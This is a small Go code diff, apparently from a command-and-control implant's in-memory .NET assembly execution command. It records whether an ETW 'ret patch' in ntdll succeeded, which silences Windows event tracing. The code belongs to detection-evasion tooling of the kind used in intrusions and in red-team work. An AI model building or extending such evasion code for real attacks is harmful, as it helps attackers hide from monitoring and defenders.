@@ -107,11 +107,11 @@ func executeAssemblyAction(assemblyB64, arguments string) structs.CommandResult 
 
 	_, etwErr := PerformRetPatch(ntdll, etwFunc)
 	if etwErr != nil {
-		// Not fatal — ETW patch is optional
 		if !strings.Contains(etwErr.Error(), "already patched") {
 			output.WriteString(fmt.Sprintf("[-] ETW patch warning: %v\n", etwErr))
 		}
 	} else {
+		etwPatched = true
 		output.WriteString("[+] ETW silenced (ret patch)\n")
 	}
 
